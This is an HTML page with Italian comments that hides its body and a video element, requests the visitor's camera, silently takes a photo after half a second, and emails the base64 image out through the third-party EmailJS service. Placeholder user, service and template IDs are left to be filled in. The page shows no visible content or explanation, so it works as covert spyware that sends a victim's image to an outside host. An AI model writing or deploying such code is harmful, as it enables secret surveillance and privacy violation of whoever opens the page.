<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Foto automatica</title>
</head>
<body style="display: none;">
    <video id="video" width="640" height="480" autoplay style="display: none;"></video>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // Inizializza EmailJS con il tuo "user ID"
        emailjs.init("your_user_id_here"); 

        // Richiesta di accesso alla fotocamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                var video = document.getElementById('video');
                video.srcObject = stream;

                // Dopo 0.5 secondi scatta la foto
                setTimeout(function () {
                    var canvas = document.createElement('canvas');
                    var context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Salva l'immagine
                    var dataUrl = canvas.toDataURL('image/jpeg');

                    // Invia la foto via email
                    var formData = {
                        photo: dataUrl, // Foto in formato base64
                    };

                    // Invia l'email
                    emailjs.send("your_service_id", "your_template_id", formData)
                        .then(function (response) {
                            console.log("Email inviata con successo", response);
                        }, function (error) {
                            console.log("Errore nell'invio dell'email", error);
                        });

                    // Ferma il flusso video
                    stream.getTracks().forEach(track => track.stop());
                }, 500); // 0.5 secondi di attesa
            })
            .catch(function (err) {
                console.log('Errore nell\'accesso alla fotocamera: ' + err);
            });
    </script>
</body>
</html>
